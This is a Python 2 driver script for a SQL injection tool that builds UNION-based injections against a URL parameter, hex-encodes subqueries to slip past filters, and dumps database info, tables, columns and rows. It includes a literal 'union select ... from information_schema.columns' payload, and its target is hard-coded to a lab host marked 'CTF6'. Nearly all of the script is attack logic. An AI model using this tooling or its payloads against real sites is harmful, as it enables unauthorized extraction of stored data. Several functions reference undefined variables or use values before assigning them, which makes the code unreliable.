#!/usr/bin/python
""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, datastore, injector, scanner, obfuscator, parser, reporter
import md5
import pprint
import json

def startup(page, param_string):
    """ Handles startup of script, flags, etc.
        :page:          String. URL before querystring.
        :param_string:  String. URL querystring.
        :returns:       String. Page ready for sqli manipulation.
    """
    params = {i.split('=')[0]:i.split('=')[1]  for i in param_string.split('&')}

    # Get SQLi vulnerable param.
    sqli_vulnerable_param = sys.argv[2][len('sqli='):]

    # Construct basic page format for sqli
    sqli = page + '?' 
    if len(params) > 1:
        sqli += "&".join([p + '=' + params[p] for p in params if p != sqli_vulnerable_param])
        sqli += '&' + sqli_vulnerable_param + '=' + params[sqli_vulnerable_param]
    else: # only one param
        sqli += sqli_vulnerable_param + '=' + params[sqli_vulnerable_param]

    return sqli 

def obfuscate_subquery(obfuscator, obfuscation, subquery):
    """ Takes subquery to obfuscate by encoding.
        :obfuscator:    Obfuscator object.
        :obfuscation:   Type of obfuscation to use. Ex, hex-encoding.
        :subquery:      String. Part of query to encode.
        :returns:       String. Encoded subquery.
    """
    
    return obfuscator.by_encoding(subquery, obfuscation)

def test_obfuscation():
    # Example obfuscation
    hexencoded = '1 union select column_name,2 from information_schema.columns where table_name = (select'
    hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
    print hexencoded

def test_sqli_info(page):
    
    fang = injector.Injector(page, "")
    report = reporter.Reporter()

    # Get column data for union statement
    print '\n### Basic Page Structure ###'
    num_columns = fang.get_num_columns() 
    report.columns_in_statement(num_columns)
    magic_num = int(fang.get_visible_param())
    print '\tMagic Param','\t', magic_num

def test_pwn(num_columns, magic_num):
    # Get DB params
    print '\n### Basic DB Info ###'
    db_data = fang.injection(build.union(num_columns, magic_num)) 
    report.db_info(parse.params(db_data))

    # Get tables
    print '### Interesting Tables ###'
    tables = fang.injection(build.tables(num_columns, magic_num)) 
    report.tables(parse.tables(tables))

    # Get columns, one table at a time
    print '\n### DB Table Columns ###'
    columns = fang.injection(build.columns(num_columns, magic_num, tables['table_name'])) 
    report.columns(parse.columns(columns))
    columns = parse.columns(columns)

    # Get rows
    for column in columns:
        x = build.rows(num_columns, magic_num, data)
        print x
    data = fang.injection(x)
    print data
    print parse.rows(data)
    #report.XXX(parse.XXX(data))

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Currently pyfang supports:'
        print 'python pyfang page="[url]" sqli="[vulnerable param]"'
        sys.exit(0)

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()
    #config = open('./configs/mysql/php/query_configs.txt').readlines()

    # Get page and dict of param => value
    #url = sys.argv[1][len('page='):] # Weird. Should be changed later.
    #page_id, param_string = tuple(url.split('?'))

    #page = startup(page_id, param_string)
    #print '\n\n'
    #print page

    # Currently handling whether string or int here, need to find place for it.
    #if len(sys.argv) > 3 and sys.argv[3] == 'string':
    #    page = page[:-1] + "'" + page[-1]

    # Instantiate classes used
    # CTF6
    page = 'http://192.168.83.134/index.php?id=1'
    build = builder.Builder(page, mysql_params)
    store = datastore.Store()
    scan = scanner.Scanner()
    fang = injector.Injector(page, "")
    report = reporter.Reporter()
    parse = parser.Parser(store)
    obfuscate = obfuscator.Obfuscator()

    num_columns = fang.get_num_columns() 
    #print num_columns
    #magic_num = int(fang.get_visible_param())
    #print num_columns, magic_num


    """
    x = build.comparative_precomputation()
    my_dict = fang.pre_comp_injection(x)

    store.create_lookup(my_dict)
    print store.lookup_table
    """


